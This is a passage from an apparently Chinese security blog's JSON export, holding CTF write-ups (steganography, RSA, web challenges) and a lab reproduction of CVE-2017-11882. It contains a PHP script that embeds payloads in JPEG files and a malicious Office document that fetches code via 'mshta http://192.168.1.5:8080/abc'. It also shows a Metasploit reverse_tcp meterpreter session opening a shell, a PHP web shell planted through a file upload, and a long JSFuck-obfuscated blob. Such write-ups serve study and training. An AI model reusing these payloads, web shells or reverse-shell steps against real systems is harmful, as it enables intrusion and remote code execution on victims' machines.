$outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage('payload_'.$argv[1], $outStream)) &#123; die('Success!'); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = ''; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die('End Of File'); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die('End Of File'); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 安装php-gdsudo apt-get install php-gd &amp;&amp; sudo service apache2 restart","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://threst.github.io/tags/php/"}]},{"title":"tjctf2018wp","slug":"tjctf2018misc","date":"2018-10-04T05:34:10.000Z","updated":"2018-10-04T07:22:32.380Z","comments":true,"path":"2018/10/04/tjctf2018misc/","link":"","permalink":"https://threst.github.io/2018/10/04/tjctf2018misc/","excerpt":"","text":"Trippystrings be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif | grep tjctf Interference1.将v1和v2用stegsolveadd下，保存图片，在改变图片的偏移量，找到黑白的二维码，用windows反色，扫描出flag2.compare v1.png v2.png output.png再把output.png用stegsolve调至黑白，windows反色. Grid Parser 解压文件，发现有个password.png，用binwalk提取出zip，使用fcrackzip --brute-force --charset a1 --length 1-3 --use-unzip xxxx.zip，爆破出密码为px Weird Logo直接stegsolve Lexington State Bank安装zsteggem install zsteg直接命令zsteg lsb.png Huuuuugenmap扫描结果如下1234567891011Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-19 21:41 CSTNmap scan report for 226.187.154.104.bc.googleusercontent.com (104.154.187.226)Host is up (0.22s latency).Not shown: 996 filtered portsPORT STATE SERVICE22/tcp open ssh80/tcp closed http5901/tcp closed vnc-19418/tcp open gitNmap done: 1 IP address (1 host up) scanned in 17.20 seconds 开放ssh和git，直接git clone git://104.154.187.226/huuuuuge失败，参考这个链接用以下命令，正好题目说不要思考太深.git clone --depth 1 git://104.154.187.226/huuuuuge RC4 took an Lhttps://github.com/dstein64/LC4/blob/master/documentation.md 1234567891011In [1]: import lc4In [2]: key = &quot;pq_xc589r3nb#mgjtkh7w2dlfvy4eaoi6uzs&quot;In [3]: encrypted = &quot;wpwt#5ng4_qbitp#8mq59r_g866c4t59c6vy6tisj4af6bprfnbd_wrq2wjmr4ld_s26a7i#biiyqjolq8lus_wfus ...: fkj8xv2qrrv3etab_marovc#uuoueyl&quot;In [4]: decrypted = lc4.decrypt(key,encrypted)In [5]: print(decrypted)i_hope_that_by_making_this_long_you_will_assume_substitution_cipher_and_go_to_quip_qiup_the_flag_is#elsie_four_is_not_rc4","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"网鼎杯wp","slug":"网鼎杯wp","date":"2018-10-04T05:32:13.000Z","updated":"2018-10-04T07:22:29.818Z","comments":true,"path":"2018/10/04/网鼎杯wp/","link":"","permalink":"https://threst.github.io/2018/10/04/网鼎杯wp/","excerpt":"","text":"网鼎杯wp套娃打开文件看见很多图片,首先判断lsb,用工具zsteg,一张一张试，试到第六张zsteg 6.png出flag1234567imagedata .. text: &quot;-+,554$&amp;&amp;&quot;b1,rgb,lsb,xy .. text: &quot;^;lI;bN$&quot;b1,bgr,lsb,xy .. text: &quot;+flag&#123;03a253f5-8e93-4533-bcfc-af908830095d&#125;\\nq&quot;b2,b,msb,xy .. file: Encore - version 8432b4,r,lsb,xy .. text: &quot;iEsx\\&quot;gwN)&quot;b4,g,lsb,xy .. text: &quot;yEsx\\&quot;gwN)&quot;b4,b,msb,xy .. text: &quot;&#123;OL?i9Ww&quot; babyrsa首先求出q,p12345678910111213141516171819202122232425262728293031323334import random def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a def getpq(n,e,d): p = 1 q = 1 while p==1 and q==1: k = d * e - 1 g = random.randint ( 0 , n ) while p==1 and q==1 and k % 2 == 0: k /= 2 y = pow(g,k,n) if y!=1 and gcd(y-1,n)&gt;1: p = gcd(y-1,n) q = n/p return p,q def main(): n =365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357 e = 65537 d = 171667543985758425014232627985840717336387122108163758500542139626729279212540485673813409388397427405892256280730752710530037468765259171638824687119216443453078833931370749271396524300663719786871097595637432285751800013612137436020725492852419342272435212733486026753609513054804440530485467017884797272879406284689903095072725307517165288748564887361729738358011463377509622604034612759898436024272853796444439505507110804160400608180412245257162062494766079887998276493727771202445125297118556385657613871902180087388189988280105656191733965985878495407148701887047735812018200868151321246119065258205755102189932618492331181731032930671506379119003614308043854723142913145153824556828017544028126772950732350030371733003652817854070184981540813302478821473998511699291112000260313162924676245915026226201977284465842505256191235822318812659628683043195357384607192367037650400361829016395922074065034014120534209020328864830006606839179592932609256661738193663329776230050481312159600570791315455079679469956882283489829258240404557309270261381865785081719442470884775430068193960751589033994677379472095235901602941733635505402949964622214247924792042997962235246007680923289071880896909708764598890244005005286926994431628289 p,q = getpq(n,e,d) print hex(p),hex(q) if __name__ == '__main__': main() 然后将enc保存起来为en文件123456789101112import gmpy2import rsaimport base64n = 365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357q = 21247215740957134093265550307601596334565934182288901633479787419858595507309542143291010899116196305518233534420568241312971809880837699847400521241640799368655041150575554308730271881769239094444859039192040949365669348829967204647597799647400611871600471392643211141324508902013965629910849583588860496396894218207070653018491227851599590460886901861118814380124225957234489558977546955544744088926474539812805322440263336981775000388601318263891815294818558967365443417213622344902893006222500539208416032217024199412011407065597780149434489493090516057515224711817526865207811206081845018578244352022299726352429p = 17218660277747658661570321204242764803630206984608091050735513899954607259990197682920217962729554631925287717895042750367376053893825222669682720379767777978420372647078471394057423219108293122309702127813213538098587207320396013417905225613995163882055903136983578393368677405597005083234898687252223168153402377438770956193242614092327835450469896527227274247481162714635222596608814392174415700802919488373733075163465872659516094599061925501245246745540660613671330140533678955280470168225630164182057506377339944396256899408381867150087697255700045339651723565686838745271371156317781031620433061297464511939833e = 65537d = int(gmpy2.invert(e,(p-1)*(q-1)))c = 595907910014897566676759273220494180110504405309206928262077375196851872198255475894354731091152236001815566589109149418500941957601976338444865345923284445575231525767013366811625019790193104404700935059348406110259409132999154793422284855871479573037198863168316139619015230842153164456415165712733168847053549666987429231550045602429647190887296150436097504253951033086041023290243394588112378415597355331197477353268041702315544498517593435582803377846605416492328428549762726997373778610297631262936044023082133389527010183648204602019909093544050106545010340111158865651714595416550877266379460461202508425081538939755155981052462387069127219471271252329219741973931444515475042747296537826297597609877185091023146800772255931184176842795811493106605043628420424570356086529035683658247137732622727936360278626896359520245649007121507751791963774871011757969835056581831379451191486773951068884218824708768124265822406883125206366165049254095060850508149142077001002691653724105471247840338330950732651135526020758912039445132132220384552395727000975811496722746325764235912590648009260905626046623587310131509221213855320504560598181447448347942432104726593025899197575968063366667049857458434444589861188997071804152577554008432377364384618217386050104523193905875708680446628674323881765587061198043253617150813946435891423000351453751011920626958050766691194569988935791651947014346084202733308461380228052483711867634858130530821103064974133728497007084932069068016812055942718671316269862791929104093268433719717198448532384887239504852113742140342891243245503616771575963935904547388496016245046067614357190925132118951805544371988522892491794366705168091658privatekey = rsa.PrivateKey(n,e,d,p,q)with open(\"en\",\"r\") as f: print(rsa.decrypt(base64.b64decode(f.read()),privatekey).decode()) 得到flagflag{w3lC0M3_t0_rS4_w0RlD}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"CVE-2017-11882复现","slug":"cve-2017-11882","date":"2018-09-18T05:34:14.000Z","updated":"2018-09-18T05:42:35.645Z","comments":true,"path":"2018/09/18/cve-2017-11882/","link":"","permalink":"https://threst.github.io/2018/09/18/cve-2017-11882/","excerpt":"","text":"0x00 漏洞简介2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。 由于漏洞影响面较广，漏洞披露后，金睛安全研究团队持续对漏洞相关攻击事件进行关注。11月19日，监控到了已有漏洞POC在网上流传，随即迅速对相关样本进行了分析。目前该样本全球仅微软杀毒可以检测。 漏洞影响版本： Office 365 Microsoft Office 2000 Microsoft Office 2003 Microsoft Office 2007 Service Pack 3 Microsoft Office 2010 Service Pack 2 Microsoft Office 2013 Service Pack 1 Microsoft Office 2016 0x01 利用工具清单：a) tcp反弹：kali 192.168.1.5b) 安装office2016的系统：win7 192.168.1.7 0x02 利用过程下载pocgithub 生成msf利用的doc123threst@threst:~/Pentest/poc/CVE-2017-11882$ python Command43b_CVE-2017-11882.py -c &quot;mshta http://192.168.1.5:8080/abc&quot; -o cve.doc[*] Done ! output file --&gt; cve.docthrest@threst:~/Pentest/poc/CVE-2017-11882$ sudo cp cve.doc /var/www/html/ msf配置Poc：开启metasploitmsfconsole使用11882模块use exploit/windows/smb/cve-2017-11882设置payloadset payload windows/meterpreter/reverse_tcp 设置选项123456789101112131415161718192021222324252627282930313233343536373839404142434445msf exploit(windows/smb/cve-2017-11882) &gt; set lhost 192.168.1.5lhost =&gt; 192.168.1.5msf exploit(windows/smb/cve-2017-11882) &gt; set URIPATH abcURIPATH =&gt; abcmsf exploit(windows/smb/cve-2017-11882) &gt; options Module options (exploit/windows/smb/cve-2017-11882): Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH abc no The URI to use for this exploit (default is random)Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none) LHOST 192.168.1.5 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Automaticmsf exploit(windows/smb/cve-2017-11882) &gt; exploit [*] Exploit running as background job 0.[*] Started reverse TCP handler on 192.168.1.5:4444 [*] Using URL: http://0.0.0.0:8080/abcmsf exploit(windows/smb/cve-2017-11882) &gt; [*] Local IP: http://192.168.1.5:8080/abc[*] Server started.[*] Place the following DDE in an MS document:mshta.exe &quot;http://192.168.1.5:8080/abc&quot;[*] 192.168.1.7 cve-2017-11882 - Delivering payload[*] Sending stage (179779 bytes) to 192.168.1.7[*] Meterpreter session 1 opened (192.168.1.5:4444 -&gt; 192.168.1.7:58478) at 2018-09-18 13:16:55 +0800 win7用360极速浏览器打开http://192.168.1.5:8080/abc 123456789101112msf exploit(windows/smb/cve-2017-11882) &gt; sessions -i 1 [*] Starting interaction with 1...meterpreter &gt; shellProcess 1440 created.Channel 1 created.Microsoft Windows [�汾 6.1.7601]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\\Users\\threst\\AppData\\Local\\360Chrome\\Chrome\\Application\\9.5.0.138&gt;whoamiwhoamithrest-pc\\threst 参考https://www.cnblogs.com/i-honey/p/7885573.html","categories":[],"tags":[{"name":"CVE-2017-11882","slug":"CVE-2017-11882","permalink":"https://threst.github.io/tags/CVE-2017-11882/"}]},{"title":"noxctf2018wp","slug":"noxctf2018wp","date":"2018-09-15T05:34:14.000Z","updated":"2018-09-18T05:44:34.577Z","comments":true,"path":"2018/09/15/noxctf2018wp/","link":"","permalink":"https://threst.github.io/2018/09/15/noxctf2018wp/","excerpt":"","text":"Reference题目 What is your reference again?http://chal.noxale.com:5000 提示我改这个Referer 我就用Firefox的改包重发改成/check_from_google bm94Q1RGe0cwb2dMM18xc180bFc0WXNfVXJfYjNTVF9SM2YzcjNuYzN9 base64解密下 flag:noxCTF{G0ogL3_1s_4lW4Ys_Ur_b3ST_R3f3r3nc3} MyFileUploader题目 This is my new file uploader server. I bet you can’t hack it!http://chal.noxale.com:8079 打开链接，可以上传文件，随便写个文件试试。shell.php 123&lt;?phpsystem($_GET[&apos;cmd&apos;]);?&gt; 提示失败，要图片类型才可以，经过几次尝试之后，把shell.php改成shell.png.txt上传试试， 居然可以！访问下，但是没有解析，看看uploads有些什么，发现一个Don&#39;t open文件夹，他说不打开就不打开吗？可以要打开看看。 AddType application/x-httpd-php .cyb3r看样子只有.cyb3r才可以解析，把文件改成这个试试。 成功了！这个文件很奇怪打开看看 curl &quot;http://chal.noxale.com:8079/uploads/shell.png.cyb3r?cmd=ls%207H3-FL4G-1S-H3r3&quot; flag:noxCTF{N3V3R_7RU57_07H3R5} Read Between The Lines题目12My boss promised me that he would give me a raise if I solve his challenge.Have I already mentioned I suck in challenges? 下载下来一个message.code,linux下打不开，不急，file试一下，提示gzip，把他后缀名改成gz就可以打开了。打开后是这样的1[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!